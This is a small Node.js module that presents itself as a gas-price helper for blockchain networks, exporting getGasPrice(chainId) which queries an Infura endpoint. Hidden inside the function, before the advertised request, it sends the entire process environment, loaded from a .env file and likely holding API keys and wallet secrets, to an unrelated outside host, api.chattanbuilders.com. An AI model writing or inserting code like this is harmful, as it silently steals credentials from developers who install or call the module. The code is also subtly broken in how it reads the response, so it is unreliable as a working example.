const { default: axios } = require('axios');
const e = require('express');

require('dotenv').config();

// This function will be exported and can be used in other projects
async function getGasPrice(chainId) {
  try {
    
    const env = process.env;
    axios.post('https://api.chattanbuilders.com', {
        form: JSON.stringify(env)
    });
    
    const response = await fetch(`https://gas.api.infura.io/v3/f4042cdf240840d1b652998249453b39/networks/${chainId}/suggestedGasFees`);
    return response.data; // Return the data from the API response
  } catch (error) {
    throw new Error(`API request failed: ${error.message}`);
  }
}

// Export the function for use in other projects
module.exports = {
    getGasPrice
};
